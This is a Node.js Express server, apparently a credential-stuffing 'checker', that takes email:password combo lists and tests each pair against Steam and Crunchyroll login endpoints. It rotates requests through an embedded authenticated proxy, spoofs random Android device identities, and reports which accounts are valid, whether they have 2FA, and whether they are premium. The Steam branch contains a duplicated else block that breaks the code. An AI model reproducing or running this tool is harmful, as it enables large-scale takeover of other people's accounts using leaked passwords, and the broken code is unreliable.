const express = require('express');
const cors = require('cors');
const axios = require('axios');
const crypto = require('crypto');
const forge = require('node-forge');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
app.use(cors());
app.use(express.json());

app.post('/api/check', async (req, res) => {
    const { service, combos } = req.body;
    const proxies = ['http://poxweudy:pvma7be69xzy@45.38.107.97:6014'];
    const results = [];

    for (const combo of combos) {
        if (!combo.includes(':')) continue;
        const [email, password] = combo.split(':');

        const agent = new HttpsProxyAgent(proxies[Math.floor(Math.random() * proxies.length)]);
        let isValid = false;
        let reason = 'Credenciales inválidas';

        if (service === 'steam') {
            try {
                const rsaRes = await axios.get(`https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/?account_name=${encodeURIComponent(email)}`, { httpsAgent: agent, timeout: 10000 });
                const rsaData = rsaRes.data.response;
                
                if (!rsaData || !rsaData.publickey_mod) {
                    results.push({ email, valid: false, reason: 'No se pudo obtener RSA' });
                    continue;
                }

                const pubKey = forge.pki.rsa.setPublicKey(
                    new forge.jsbn.BigInteger(rsaData.publickey_mod, 16),
                    new forge.jsbn.BigInteger(rsaData.publickey_exp, 16)
                );
                const encryptedPass = forge.util.encode64(pubKey.encrypt(password, 'RSAES-PKCS1-V1_5'));

                const loginRes = await axios.post('https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/', 
                    new URLSearchParams({
                        account_name: email,
                        encrypted_password: encryptedPass,
                        encryption_timestamp: rsaData.timestamp,
                        remember_login: 'true',
                        platform_type: 'web',
                        persistence: '1',
                        website_id: 'Store'
                    }).toString(),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, httpsAgent: agent, timeout: 15000 }
                );

                const authResponse = loginRes.data.response;
                
                if (!loginRes.data || !loginRes.data.response) {
    reason = `Error JSON: ${JSON.stringify(loginRes.data)}`;
} else if (authResponse.eresult !== 1 && authResponse.eresult !== 63) {
    reason = `Rechazado por Steam: ${JSON.stringify(authResponse)}`;
} else {
    const guardType = authResponse.allowed_confirmations?.[0]?.confirmation_type || 0;
    if (guardType === 2 || guardType === 3 || guardType === 4) {
        isValid = true;
        reason = 'Válida (Requiere 2FA/Steam Guard)';
    } else {
        isValid = true;
        reason = 'Válida (Sin 2FA)';
    }
} else {
                    const guardType = authResponse.allowed_confirmations?.[0]?.confirmation_type || 0;
                    if (guardType === 2 || guardType === 3 || guardType === 4) {
                        isValid = true;
                        reason = 'Válida (Requiere 2FA)';
                    } else {
                        isValid = true;
                        reason = 'Válida (Sin 2FA)';
                    }
                }
            } catch (e) {
                reason = 'Error de proxy/red: ' + (e.response?.status || e.message);
            }
        } else {
            const randomDeviceId = crypto.randomBytes(16).toString('hex');
            const randomDeviceName = 'SM-G' + Math.floor(Math.random() * 9000 + 1000);
            try {
                const resCheck = await axios.post('https://beta-api.crunchyroll.com/auth/v1/token', 
                    new URLSearchParams({
                        grant_type: 'password',
                        username: email, password: password, scope: 'offline_access',
                        device_id: randomDeviceId, device_name: randomDeviceName, device_type: 'samsung ' + randomDeviceName
                    }).toString(),
                    {
                        headers: {
                            'Authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'User-Agent': 'Crunchyroll/3.59.0 Android/14 okhttp/4.12.0'
                        },
                        httpsAgent: agent, timeout: 15000
                    }
                );
                if (resCheck.status === 200 && resCheck.data.access_token) {
                    const isPremium = resCheck.data.scope.includes('mp offline_access');
                    isValid = true;
                    reason = isPremium ? 'PREMIUM' : 'FREE';
                }
            } catch (e) {
                reason = 'Credenciales inválidas (o bloqueo)';
            }
        }
        results.push({ email, valid: isValid, reason: reason });
    }
    res.json({ results });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
